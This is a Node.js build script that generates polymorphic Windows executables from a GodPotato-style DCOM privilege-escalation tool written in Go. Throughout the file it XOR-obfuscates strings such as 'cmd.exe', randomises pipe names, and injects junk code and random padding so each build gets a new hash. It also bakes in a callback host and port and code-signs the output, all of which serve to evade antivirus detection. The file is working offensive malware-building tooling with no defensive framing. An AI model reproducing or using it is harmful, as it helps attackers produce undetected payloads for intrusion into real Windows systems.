/**
 * Polymorphic Go build for windows_dcom_tool (DCOM / GodPotato-style).
 */
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const {
  randomId,
  randomKey,
  obfuscateString,
  run,
  readManifest,
  writeManifest,
  defaultOutputBase,
  BUILDS_DIR,
} = require('./polymorph');
const { signPeFile } = require('./signing');

const ROOT = path.join(__dirname, '..');
const DCOM_SRC = path.join(ROOT, 'windows_dcom_tool');

const PLAIN_DCOM = {
  obfCmdExe: 'cmd.exe',
  obfErrNeedAct: '[!] need -c, -H/-P, or -u/-pw',
};

function listDcomGoFiles() {
  return fs.readdirSync(DCOM_SRC).filter((f) => f.endsWith('.go'));
}

function mutateDcomSource(src, opts = {}) {
  const { xorKey, stamp, buildid, pipeDefault, defaultLhost, defaultLport } = opts;
  let out = src;
  if (xorKey) {
    out = out.replace(/const xorKeyDcom = "[^"]*"/, `const xorKeyDcom = "${xorKey}"`);
    for (const [name, plain] of Object.entries(PLAIN_DCOM)) {
      const hex = obfuscateString(plain, xorKey);
      const re = new RegExp(`(${name}\\s*=\\s*)"[^"]*"`, 'g');
      out = out.replace(re, `$1"${hex}"`);
    }
  }
  if (pipeDefault) {
    out = out.replace(
      /flag\.StringVar\(&pipeName, "p", "[^"]*",/,
      `flag.StringVar(&pipeName, "p", "${pipeDefault.replace(/"/g, '')}",`
    );
  }
  if (stamp && buildid) {
    const noise = Array.from(crypto.randomBytes(48));
    const junk = `
var (
	polyDcomStamp_${stamp.slice(0, 8)} = "${stamp}"
	polyDcomNoise_${stamp.slice(8, 16)} = []byte{${noise.join(', ')}}
	PolyDcomBuildId = "${buildid}"
)

func polyDcomFingerprint() byte {
	return polyDcomNoise_${stamp.slice(8, 16)}[0] ^ polyDcomStamp_${stamp.slice(0, 8)}[0] ^ PolyDcomBuildId[0]
}
`;
    if (!out.includes('polyDcomStamp_')) {
      const im = out.match(/\nimport\s*\([\s\S]*?\n\)/);
      if (im && im.index != null) {
        const at = im.index + im[0].length;
        out = out.slice(0, at) + '\n' + junk + out.slice(at);
      } else {
        const im2 = out.match(/\nimport "[^"]+"\r?\n/);
        if (im2 && im2.index != null) {
          const at = im2.index + im2[0].length;
          out = out.slice(0, at) + junk + out.slice(at);
        }
      }
      out = out.replace(/func main\(\) \{/, 'func main() {\n\t_ = polyDcomFingerprint()');
    }
  }
  if (defaultLhost && out.includes('lhost')) {
    out = out.replace(/lhost\s*=\s*""/, `lhost = ${JSON.stringify(defaultLhost)}`);
  }
  if (defaultLport && out.includes('lport')) {
    out = out.replace(/lport\s*=\s*0/, `lport = ${defaultLport}`);
  }
  return out;
}

async function generateDcomGoBuild(options = {}) {
  if (!fs.existsSync(DCOM_SRC)) {
    throw new Error('windows_dcom_tool/ missing');
  }

  const arch = String(options.arch || 'amd64').toLowerCase();
  if (arch !== 'amd64' && arch !== '386') {
    throw new Error('DCOM Go tool supports amd64/386 only');
  }

  const id = randomId();
  const xorKey = randomKey(16 + (crypto.randomBytes(1)[0] % 8));
  const stamp = crypto.randomBytes(24).toString('hex');
  const buildid = crypto.randomBytes(16).toString('hex');
  const pipeDefault = `Crystal_${crypto.randomBytes(3).toString('hex')}`;

  const workDir = path.join(BUILDS_DIR, id);
  fs.mkdirSync(workDir, { recursive: true });

  for (const f of listDcomGoFiles()) {
    let raw = fs.readFileSync(path.join(DCOM_SRC, f), 'utf8');
    if (f === 'main.go') {
      raw = mutateDcomSource(raw, {
        xorKey,
        stamp,
        buildid,
        pipeDefault,
        defaultLhost: options.host || undefined,
        defaultLport: options.port > 0 ? options.port : undefined,
      });
    } else if (f === 'obf.go') {
      raw = mutateDcomSource(raw, { xorKey });
    }
    fs.writeFileSync(path.join(workDir, f), raw, 'utf8');
  }

  fs.writeFileSync(
    path.join(workDir, 'go.mod'),
    `module dcom_build_${id.replace(/[^a-z0-9]/gi, '')}\n\ngo 1.21\n\nrequire golang.org/x/sys v0.28.0\n`,
    'utf8'
  );

  const baseName = (options.outputName || defaultOutputBase('windows', 'dcom')).replace(/[<>:"/\\|?*\s]/g, '_');
  const outName = baseName.toLowerCase().endsWith('.exe') ? baseName : `${baseName}.exe`;
  const outPath = path.join(workDir, outName);

  // PE console subsystem (default -H=windows), not windowsgui — so -h and cmd output work.
  const ldflags = `-s -w -H=windows -X main.PolyDcomBuildId=${buildid} -buildid=${buildid}`;
  const env = { ...process.env, GOOS: 'windows', GOARCH: arch, CGO_ENABLED: '0' };

  await run('go', ['mod', 'tidy'], { cwd: workDir, env });
  await run('go', ['build', '-trimpath', `-ldflags=${ldflags}`, '-o', outPath, '.'], { cwd: workDir, env });

  const pad = crypto.randomBytes(256 + (crypto.randomBytes(1)[0] % 3840));
  fs.appendFileSync(outPath, pad);

  const signResult = await signPeFile(outPath, {
    enabled: options.signCode !== false,
    subject: options.signSubject,
    autoLab: options.signAuto !== false,
  });
  const sha256 = crypto.createHash('sha256').update(fs.readFileSync(outPath)).digest('hex');
  const stat = fs.statSync(outPath);

  const meta = {
    id,
    platform: 'windows',
    arch,
    variant: 'dcom',
    tool: 'go-dcom',
    format: 'exe',
    host: options.host || undefined,
    port: options.port > 0 ? options.port : undefined,
    fileName: outName,
    size: stat.size,
    sha256,
    xorKeyLen: xorKey.length,
    stamp: stamp.slice(0, 16),
    buildid,
    pipeName: pipeDefault,
    injectDllPacked: false,
    authenticodeSigned: !!signResult.signed,
    signPublisher: signResult.publisher,
    signNote: signResult.signed ? undefined : (signResult.reason || undefined),
    createdAt: new Date().toISOString(),
  };
  fs.writeFileSync(path.join(workDir, 'meta.json'), JSON.stringify(meta, null, 2));
  const list = readManifest();
  list.unshift(meta);
  writeManifest(list.slice(0, 100));
  return meta;
}

module.exports = { generateDcomGoBuild };
